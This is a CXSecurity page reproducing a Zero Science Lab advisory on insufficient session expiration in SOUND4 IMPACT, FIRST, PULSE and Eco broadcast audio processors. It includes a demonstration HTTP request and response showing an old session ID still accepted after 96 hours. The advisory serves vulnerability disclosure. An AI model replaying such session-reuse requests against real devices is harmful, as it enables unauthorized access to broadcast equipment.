---
title: SOUND4 IMPACT/FIRST/PULSE/Eco 2.x Insufficient Session Expiration
url: https://cxsecurity.com/issue/WLB-2022120030
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-17
fetch_date: 2025-10-04T01:43:58.306617
---

# SOUND4 IMPACT/FIRST/PULSE/Eco 2.x Insufficient Session Expiration

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **SOUND4 IMPACT/FIRST/PULSE/Eco 2.x Insufficient Session Expiration** **2022.12.16**  Credit:  **[LiquidWorm](https://cxsecurity.com/author/LiquidWorm/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **N/A** | |

SOUND4 IMPACT/FIRST/PULSE/Eco <=2.x Insufficient Session Expiration
Vendor: SOUND4 Ltd.
Product web page: https://www.sound4.com | https://www.sound4.biz
Affected version: 4.1.102
Summary: The SOUND4 IMPACT introduces an innovative process - mono and
stereo parts of the signal are processed separately to obtain perfect
consistency in terms of both sound and level. Therefore, in moving
reception, when the FM receiver switches from stereo to mono and back to
stereo, the sound variations and changes in level are reduced by over 90%.
In the SOUND4 IMPACT processing chain, the stereo expander can be used
substantially without any limitations.
With its advanced functionalities and impressive versatility, SOUND4
PULSE gives clients the ultimate price - performance ratio, providing
much more than just a processor. Flexible and powerful, it ensures perfect
sound quality and full compatibility with radio broadcasting standards
and can be used simultaneously for FM and HD, DAB, DRM or streaming.
SOUND4 FIRST provides all the most important functionalities you need
in an FM/HD processor and sets the bar high both in terms of performance
and affordability. Designed to deliver a sound of uncompromising quality,
this tool gives you 2-band processing, a digital stereo generator and an
IMPACT Clipper.
Desc: The application suffers an insufficient session expiration. This
occurs when the web application permits an attacker to reuse old session
credentials or session IDs for authorization. Insufficient session expiration
increases the device's exposure to attacks that can steal or reuse user's
session identifiers.
Tested on: Apache/2.4.25 (Unix)
OpenSSL/1.0.2k
PHP/7.1.1
GNU/Linux 5.10.43 (armv7l)
GNU/Linux 4.9.228 (armv7l)
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
Macedonian Information Security Research and Development Laboratory
Zero Science Lab - https://www.zeroscience.mk - @zeroscience
Advisory ID: ZSL-2022-5724
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5724.php
26.09.2022
--
Session valid after 96 hours:
POST /checklogin.php HTTP/1.1
Host: RADIO
Cookie: PHPSESSID=q9rooqkl3kl20aianmveimu23q; monitor-mp3-bitrate=128; monitor-volume=1; settings\_accordion\_active=3; netdiagsaccordion\_last=0
Content-Length: 34
Sec-Ch-Ua: "Chromium";v="105", "Not)A;Brand";v="8"
Accept: \*/\*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://RADIO
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://RADIO/linkandshare.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
session=q9rooqkl3kl20aianmveimu23q
HTTP/1.1 200 OK
Date: Sat, 03 Jan 1970 11:13:19 GMT
Server: Apache/2.4.25 (Unix) OpenSSL/1.0.2k PHP/7.1.1
X-Powered-By: PHP/7.1.1
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: User-Agent
Content-Length: 1
Connection: close
Content-Type: text/html; charset=UTF-8
0

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022120030)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top